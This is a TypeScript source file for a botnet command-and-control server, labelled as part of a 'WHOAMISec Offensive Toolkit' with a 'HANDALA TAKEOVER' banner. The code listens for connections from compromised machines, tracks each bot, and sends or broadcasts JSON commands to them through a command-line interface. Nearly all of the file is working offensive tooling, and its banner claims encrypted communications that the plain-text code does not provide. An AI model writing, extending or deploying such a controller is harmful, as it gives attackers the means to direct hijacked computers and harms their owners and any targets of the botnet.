/**
 * Botnet C2 Controller - WHOAMISec Offensive Toolkit
 * Advanced botnet command and control interface
 * TypeScript/Node.js Implementation
 */

import * as net from 'net';
import * as fs from 'fs';
import { EventEmitter } from 'events';

interface C2Config {
  port: number;
  maxBots: number;
}

interface BotConnection {
  id: string;
  socket: net.Socket;
  ip: string;
  port: number;
  connectedAt: Date;
  lastSeen: Date;
  status: 'active' | 'idle' | 'dead';
}

interface C2Stats {
  totalConnections: number;
  activeBots: number;
  deadBots: number;
  uptime: number;
  commandsSent: number;
}

class BotnetC2Controller extends EventEmitter {
  private server: net.Server;
  private bots: Map<string, BotConnection> = new Map();
  private config: C2Config;
  private stats: C2Stats;
  private startTime: Date;
  private commandHistory: Array<{timestamp: Date, command: string, target?: string}> = [];

  constructor(config: C2Config) {
    super();
    this.config = config;
    this.startTime = new Date();
    this.stats = {
      totalConnections: 0,
      activeBots: 0,
      deadBots: 0,
      uptime: 0,
      commandsSent: 0
    };

    this.server = net.createServer((socket) => {
      this.handleBotConnection(socket);
    });
  }

  private handleBotConnection(socket: net.Socket): void {
    const botId = this.generateBotId();
    const bot: BotConnection = {
      id: botId,
      socket: socket,
      ip: socket.remoteAddress || 'unknown',
      port: socket.remotePort || 0,
      connectedAt: new Date(),
      lastSeen: new Date(),
      status: 'active'
    };

    this.bots.set(botId, bot);
    this.stats.totalConnections++;
    this.stats.activeBots++;

    console.log(`[+] Bot connected: ${botId} (${bot.ip}:${bot.port})`);
    this.emit('botConnected', bot);

    socket.on('data', (data) => {
      this.handleBotData(botId, data.toString());
    });

    socket.on('close', () => {
      this.handleBotDisconnect(botId);
    });

    socket.on('error', (error) => {
      console.error(`[!] Bot error ${botId}:`, error.message);
      this.handleBotDisconnect(botId);
    });

    // Send initial command
    this.sendCommand(botId, 'PING');
  }

  private handleBotData(botId: string, data: string): void {
    const bot = this.bots.get(botId);
    if (!bot) return;

    bot.lastSeen = new Date();
    bot.status = 'active';

    const messages = data.split('\n').filter(msg => msg.trim() !== '');
    
    for (const message of messages) {
      try {
        const parsed = JSON.parse(message);
        console.log(`[${botId}] ${parsed.type}: ${parsed.data}`);
        this.emit('botMessage', botId, parsed);
      } catch {
        console.log(`[${botId}] Raw: ${message}`);
      }
    }
  }

  private handleBotDisconnect(botId: string): void {
    const bot = this.bots.get(botId);
    if (!bot) return;

    bot.status = 'dead';
    this.stats.activeBots--;
    this.stats.deadBots++;

    console.log(`[-] Bot disconnected: ${botId}`);
    this.emit('botDisconnected', botId);
  }

  private generateBotId(): string {
    return `BOT-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  public sendCommand(botId: string, command: string, data?: any): boolean {
    const bot = this.bots.get(botId);
    if (!bot || bot.status !== 'active') {
      return false;
    }

    try {
      const message = JSON.stringify({
        type: 'command',
        command: command,
        data: data,
        timestamp: new Date().toISOString()
      }) + '\n';

      bot.socket.write(message);
      this.stats.commandsSent++;
      this.commandHistory.push({
        timestamp: new Date(),
        command: command,
        target: botId
      });

      console.log(`[>] Sent to ${botId}: ${command}`);
      return true;
    } catch (error) {
      console.error(`[!] Failed to send command to ${botId}:`, error);
      return false;
    }
  }

  public broadcastCommand(command: string, data?: any): number {
    let sent = 0;
    for (const [botId, bot] of this.bots) {
      if (bot.status === 'active') {
        if (this.sendCommand(botId, command, data)) {
          sent++;
        }
      }
    }
    return sent;
  }

  public getActiveBots(): BotConnection[] {
    return Array.from(this.bots.values()).filter(bot => bot.status === 'active');
  }

  public getBotStats(): C2Stats {
    const now = new Date();
    const uptime = Math.floor((now.getTime() - this.startTime.getTime()) / 1000);
    
    return {
      ...this.stats,
      uptime,
      activeBots: this.getActiveBots().length
    };
  }

  public getBotDetails(botId: string): BotConnection | undefined {
    return this.bots.get(botId);
  }

  public start(): Promise<void> {
    return new Promise((resolve, reject) => {
      this.server.listen(this.config.port, () => {
        console.log(`[+] C2 Server started on port ${this.config.port}`);
        console.log(`[+] Max bots allowed: ${this.config.maxBots}`);
        this.emit('serverStarted', this.config.port);
        resolve();
      });

      this.server.on('error', (error) => {
        console.error(`[!] Server error:`, error);
        reject(error);
      });
    });
  }

  public stop(): Promise<void> {
    return new Promise((resolve) => {
      // Disconnect all bots
      for (const [botId, bot] of this.bots) {
        if (bot.status === 'active') {
          bot.socket.destroy();
        }
      }

      this.server.close(() => {
        console.log('[+] C2 Server stopped');
        this.emit('serverStopped');
        resolve();
      });
    });
  }

  public printBanner(): void {
    console.log(`
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║  ✋✋✋ BOTNET C2 CONTROLLER - HANDALA TAKEOVER ✋✋✋                                   ║
║  █     █░▓█████  ██▀███   ███▄ ▄███▓▓█████  ██▓███   ▄▄▄█████▓░██████╗ ██╗          ║
║  ▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒▒██    ▒ ▒██║          ║
║  ▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒▓██    ▓██░▒███   ▓██░ ██▓▒▒ ▓██░ ▒░░ ▓██▄   ░██║          ║
║  ░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░   ▒   ██▒░██║          ║
║  ░░██▒██▓ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒██████▒▒░██║          ║
║  ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ▒ ▒▓▒ ▒ ░░▓  ║
║    ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░░  ░      ░ ░ ░  ░░▒ ░         ░    ░  ░▒  ░ ░ ▒ ░║
║    ░   ░     ░     ░░   ░ ░      ░      ░   ░░         ░ ░    ░  ░  ░   ▒ ░║
║      ░       ░  ░   ░            ░      ░  ░                       ░   ░   ║
║                                                                           ║
║        BOTNET C2 CONTROLLER - ADVANCED COMMAND & CONTROL                  ║
║   Multi-Threaded | Encrypted Communications | Real-time Monitoring         ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
    `);
  }
}

// CLI Interface
if (require.main === module) {
  const args = process.argv.slice(2);
  
  if (args.length < 2) {
    console.log('Usage: node botnet-c2-controller.js <port> <maxBots> [action]');
    console.log('Actions: start, stop, status');
    process.exit(1);
  }

  const config: C2Config = {
    port: parseInt(args[0]),
    maxBots: parseInt(args[1])
  };

  const controller = new BotnetC2Controller(config);
  const action = args[2] || 'start';

  controller.printBanner();

  switch (action) {
    case 'start':
      controller.start()
        .then(() => {
          console.log('[+] C2 Controller started successfully');
          
          // Keep the process alive
          process.on('SIGINT', async () => {
            console.log('\n[!] Shutting down C2 Controller...');
            await controller.stop();
            process.exit(0);
          });
        })
        .catch(error => {
          console.error('[!] Failed to start C2 Controller:', error);
          process.exit(1);
        });
      break;

    case 'status':
      const stats = controller.getBotStats();
      console.log(JSON.stringify({
        tool: "botnet-c2-controller",
        timestamp: new Date().toISOString(),
        status: "running",
        stats: stats
      }, null, 2));
      break;

    case 'stop':
      controller.stop()
        .then(() => {
          console.log('[+] C2 Controller stopped');
          process.exit(0);
        })
        .catch(error => {
          console.error('[!] Failed to stop C2 Controller:', error);
          process.exit(1);
        });
      break;

    default:
      console.log('Invalid action. Use: start, stop, status');
      process.exit(1);
  }
}

export { BotnetC2Controller, C2Config, BotConnection, C2Stats };